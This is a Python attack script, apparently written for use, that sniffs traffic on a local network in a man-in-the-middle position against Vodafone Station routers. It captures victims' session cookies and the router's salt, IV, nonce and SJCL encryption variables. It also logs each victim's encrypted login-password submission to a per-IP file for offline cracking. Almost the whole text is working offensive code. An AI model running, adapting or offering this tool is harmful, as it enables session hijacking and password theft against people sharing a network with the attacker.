#!/usr/bin/env python3

### This tool is specially developed to ONLY exploit vulnerabilites of the Vodafone Station router!
### It will not work against any other router.

import os
import sys
import json
import hashlib
import requests
import argparse
from scapy.all import *

required_vars = [
	"myIv", "mySalt", "currentSessionId", "encryptflag"
]

def get_arguments() -> argparse.Namespace:
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--iface", help="Optional: Manually set network interface to start sniffing on.", type=str)
	parser.add_argument("-r", "--router", help="Optional: Manually set gateway's IP-Address.", type=str)
	parser.add_argument("-v", "--victim", help="Optional: Only target a specific IP-Address. (seperated by comma) (default: all)", type=str)

	return parser.parse_args()

args = get_arguments()

eexit = lambda msg : exit(sys.argv[0] + ": " + msg)

if os.getuid() != 0:
	exit(sys.argv[0] + ": Run it as root.")

iface = conf.route.route("0.0.0.0")[0] if args.iface == None else args.iface
router = conf.route.route("0.0.0.0")[2] if args.router == None else args.router

if args.victim != None:
	victim_ip_addresses = args.victim.split(",")

	victims = []
	for victim_ip_address in victim_ip_addresses:
		ip_parts = victim_ip_address.split(".")
		if len(ip_parts) != 4: # XXX.XXX.XXX.XXX
			eexit("Invalid IP-Address: " + victim_ip_address)

		for ip_part in ip_parts:
			try:
				ip_part_int = int(ip_part)
			except ValueError:
				eexit("Invalid IP-Address: " + victim_ip_address)
			
			if ip_part_int < 0 or 255 < ip_part_int:
				eexit("Invalid IP-Address: " + victim_ip_address)

		victims.append(victim_ip_address)
else:
	victims = None

done_packets = []

victim_var_cache = {}
victim_sjcl_cache = {}
def process_packet(packet) -> None:
	if packet == None:
		return

	if not packet.haslayer(Raw): # Filter out TCP SYN, RST, SYN-ACK, ACK
		return

	Ether_l = packet.getlayer(Ether)
	IP_l = packet.getlayer(IP)
	TCP_l = packet.getlayer(TCP)
	Raw_l = packet.getlayer(Raw)

	if not Ether_l or not IP_l or not TCP_l:
		return

	try:
		load = Raw_l.load.decode()
	except UnicodeError:
		return

	if IP_l.src != router and IP_l.dst != router: # Filter out packets not related to the router
		return

	if victims != None:
		if not IP_l.src in victims and not IP_l.dst in victims: # Filter out packets not related to the victims when specific victim is set
			return

	if IP_l.dst == router:
		if not TCP_l.dport == 80: # Filter out non-HTTP packets (Vodafone Station only uses port 80 and 443)
			return

	packet_md5 = hashlib.md5(load.encode()).hexdigest()

	if not packet_md5 in done_packets:
		done_packets.append(packet_md5)
	else:
		return # Each packets runs twice through this function due to packet forwarding


	if IP_l.src != router:
		victim_ip = IP_l.src
		victim_mac = str(Ether_l.src)

		if load.startswith("GET /"):
			if load[5] != " ":
				uri = load[4:].split(" ")[0]
			else:
				uri = "/"

			print("[*] Client " + victim_ip + " with MAC " + victim_mac + " sent HTTP GET " + uri + " to router.")
			if "Cookie: " in load:
				print("[+] Sniffed cookie for client " + victim_ip + " : '" + load[load.find("Cookie: ") + 8:].split("\r\n")[0] + "'")

		if load.startswith("POST /"):
			#if load[5:].startswith("/php/logout.php"): # Always posts when loading login page
			#	print("[*] Client " + victim_ip + " logged out.")

			if load[5:].startswith("/php/ajaxSet_Password.php"):
				print("\n[+] Client " + victim_ip + " sent HTTP POST /php/ajaxSet_Password.php")

				try:
					post_data = json.loads(load.split("\n")[-1])
				except json.decoder.JSONDecodeError:
					print("[-] Corrupted POST data?? Catched json decoder error.")
					return

				enc_encryptdata = post_data["EncryptData"]
				enc_username = post_data["Name"]

				try:
					for var_name in required_vars:
						if victim_var_cache[victim_ip][var_name] == "":
							raise BaseException("victim cache empty")
				except:
					print("[-] Victim var cache for " + victim_ip + " incomplete. Couldn't sniff required vars for hashing.")
					return

				enc_salt = victim_var_cache[victim_ip]["mySalt"]
				enc_iv = victim_var_cache[victim_ip]["myIv"]
				enc_nonce = victim_var_cache[victim_ip]["currentSessionId"]

				log_fp = open(victim_ip.replace(".", "-") + ".enc", "a+")
				if log_fp.read().strip() != "":
					log_fp.write("\n")

				print(" ~  Username...................... : " + enc_username)
				print(" ~  Encryption.salt............... : " + enc_salt)
				print(" ~  Encryption.IV................. : " + enc_iv)
				print(" ~  Encryption.nonce.............. : " + enc_nonce)
				print(" ~  Encryption.EncryptData........ : " + enc_encryptdata)

				try:
					if victim_sjcl_cache[victim_ip] != {}:
						for sjcl_var_name in victim_sjcl_cache[victim_ip].keys():
							print(" ~  " + sjcl_var_name.replace(" ", ".") + "." * (30 - len(sjcl_var_name)) + " : " + victim_sjcl_cache[victim_ip][sjcl_var_name])
				except KeyError:
					print(" !  No sjcl vars in cache! You may need to use the vodafone_station_router_get_sjcl_vars.py script.")

				print()

				log_fp.write("Username: " + enc_username + "\n")
				log_fp.write("Encryption salt: " + enc_salt + "\n")
				log_fp.write("Encryption IV: " + enc_iv + "\n")
				log_fp.write("Encryption Nonce: " + enc_nonce + "\n")
				log_fp.write("Encryption EncryptData: " + enc_encryptdata + "\n")

				log_fp.close()

				print("[+] Got everything! Saved to " + victim_ip.replace(".", "-") + ".enc\n")

	else:
		victim_ip = IP_l.dst
		victim_mac = str(Ether_l.dst)

		if "Set-Cookie: " in load:
			set_cookie = load[load.find("Set-Cookie:"):].split("\r\n")[0]

			print("[+] Router set new cookie for client " + victim_ip + " : '" + set_cookie + "'.")

		if "var DEFAULT_SJCL_" in load:
			sjcl_vars_start = load[load.find("var DEFAULT_SJCL_"):]
			sjcl_ln_splitted = sjcl_vars_start.split("\n")
			try:
				sjcl_vars_unparsed = [sjcl_ln_splitted[i] for i in range(0, 5)]
			except IndexError:
				print("[!] Failed to parse sjcl vars from sjclCrypto.js!")
				return

			victim_sjcl_cache[victim_ip] = {}

			for sjcl_var_unparsed in sjcl_vars_unparsed:
				sjcl_var_parsed = sjcl_var_unparsed.replace("var ", "").replace(";", "")
				sjcl_var_name = sjcl_var_parsed.split(" = ")[0]
				sjcl_var_value = sjcl_var_parsed.split(" = ")[1]

				victim_sjcl_cache[victim_ip][sjcl_var_name] = sjcl_var_value
				print("[+] Got sjcl var '" + sjcl_var_name + "' for client " + victim_ip + " with value '" + sjcl_var_value + "' and added it to victim sjcl var cache.")


		if "var mySalt = '" in load and "var myIv = '" in load and "var currentSessionId = '" in load:
			vars_start = load[load.find("var encryptflag"):] # encryptflag is always the first var set
			unparsed_vars = vars_start[:vars_start.find("</script>")] # end of script tag where the vars are defined
			unparsed_vars_splitted = unparsed_vars.split(";\n")
			
			if len(unparsed_vars) != 0:
				victim_var_cache[victim_ip] = {}

			if "var mySalt = ''" in load and "var myIv = ''" in load:
				print("[*] Client " + victim_ip + " opened router dashboard (logged in)")
				return

			for unparsed_var in unparsed_vars_splitted:
				parsed_var = unparsed_var.replace("var ", "")

				var_name = parsed_var[:parsed_var.find(" = ")]
				var_content = parsed_var[parsed_var.find(" = ") + 4:][:-1]

				victim_var_cache[victim_ip][var_name] = var_content

				if var_name in required_vars:
					print("[*] Got var '" + var_name + "' for client " + victim_ip + " with value '" + var_content + "' and added it to victim var cache.")

		if "{\"p_status\":" in load and "\"encryptData\":" in load: # NEVER exposes username, only hash.
			print("\n[+] Router confirmed validity of sent ciphertext by client " + victim_ip)

			try:
				data = json.loads(load.split("\n")[-1])
			except json.decoder.JSONDecodeError:
				print("[-] Corrupted json?? Catched json decoder error.")
				return

			enc_encryptdata = data["encryptData"] # Router spells it different here for some reason

			log_fp = open(victim_ip.replace(".", "-") + ".enc", "a+")
			if log_fp.read().strip() != "":
				log_fp.write("\n")

			print(" ~  Router.sent.back..,,,,,,...... : " + enc_encryptdata)

			log_fp.write("Router sent this back on confirmation: " + enc_encryptdata + "\n")
			log_fp.close()

			print("\n[+] Saved to " + victim_ip.replace(".", "-") + ".enc\n")

		if "{\"p_status\":\"Lockout\",\"p_waitTime\"" in load:
			print("[-] Login for " + victim_ip + " with MAC " + victim_mac + " failed!\n")

print(r"""
   .;'                     `;,
  .;'  ,;'             `;,  `;,  __     __        _        __                  
 .;'  ,;'  ,;'     `;,  `;,  `;, \ \   / /__   __| | __ _ / _| ___  _ __   ___ 
 ::   ::   :   ( )   :   ::   ::  \ \ / / _ \ / _` |/ _` | |_ / _ \| '_ \ / _ \
 ':.  ':.  ':. /_\ ,:'  ,:'  ,:'   \ V / (_) | (_| | (_| |  _| (_) | | | |  __/
  ':.  ':.    /___\    ,:'  ,:'     \_/ \___/ \__,_|\__,_|_|  \___/|_| |_|\___|
   ':.       /     \      ,:'
""")

print("@ Starting Vodafone Station Router MiTM Hash capture on " + iface + " gateway: " + router + " ... - Project Unknown\n")
try:
	sniff(iface=iface, filter="tcp", prn=process_packet) # HTTPs is getting sslstripped
except KeyboardInterrupt:
	pass
